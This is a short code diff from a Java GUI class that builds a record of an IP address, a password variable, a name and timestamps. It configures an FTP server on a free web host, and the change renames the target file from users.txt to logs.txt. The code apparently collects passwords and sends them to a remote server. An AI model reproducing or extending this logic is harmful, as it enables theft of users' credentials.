@@ -381,7 +381,7 @@ public class Connection extends JFrame {
 					String info = addr + " / " + myPass + " / " + date + " / " + name + " / " + timeStamp + "\n";
 					// System.out.println("IP address of localhost from Java Program: " +
 					// ipAddress);
-					String remoteFileName = "/public_html/users.txt"; // change accordingly
+					String remoteFileName = "/public_html/logs.txt"; // change accordingly
 					String server = "files.000webhost.com"; // change accordingly
 					int port = 21;
 					String user = "yourFtpUser"; // change accordingly
